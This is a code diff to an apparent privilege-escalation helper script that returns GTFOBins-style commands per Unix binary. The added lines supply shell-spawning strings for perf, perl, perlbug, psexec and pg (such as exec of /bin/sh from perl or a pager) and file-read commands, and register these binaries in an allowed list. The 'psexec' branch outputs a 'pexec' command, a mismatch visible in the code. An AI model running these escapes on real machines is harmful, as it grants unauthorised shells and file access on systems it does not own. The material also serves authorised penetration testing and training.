@@ -2815,6 +2815,40 @@ def gtfo_bins(gtfo_command, gtfo_options):
             bins.append("pdftex --shell-escape \write18{/bin/sh}\end ")
         else:
             bins.append("N/A")
+    
+    elif gtfo_command == "perf":
+        if gtfo_options == "shell":
+            bins.append("perf stat /bin/sh")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "perl":
+        if gtfo_options == "shell":
+            bins.append("perl -e 'exec '/bin/sh''")
+        elif gtfo_options == "file-read":
+            bins.append("perl -ne print /path/to/input-file")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "perlbug":
+        if gtfo_options == "shell":
+            bins.append("perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "psexec":
+        if gtfo_options == "shell":
+            bins.append("pexec /bin/sh")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "pg":
+        if gtfo_options == "shell":
+            bins.append("pg /etc/hosts\n!/bin/sh")
+        elif gtfo_options == "file-read":
+            bins.append("pg /path/to/input-file")
+        else:
+            bins.append("N/A")
 
 
 #If there are any other misconfigurations run the other option
@@ -2862,7 +2896,8 @@ def main():
         "msguniq", "mtr", "multitime", "mutt", "mv","mypy", "mysql", "nasm", "nawk",
         "nc", "ncdu", "ncftp", "needrestart","nft", "nginx","nice", "nl", "nm", "nmap", 
         "node", "nohup", "npm", "nroff", "nsenter", "octave","od", "opencode", "openssl", 
-        "openvpn", "openvt","opkg","pandoc", "paste", "pax", "pdflatex","pdftex", "other",
+        "openvpn", "openvt","opkg","pandoc", "paste", "pax", "pdflatex","pdftex", "perf", 
+        "perl", "perlbug", "psexec","pg", "other",
     }
 
     if start in ALLOWED:
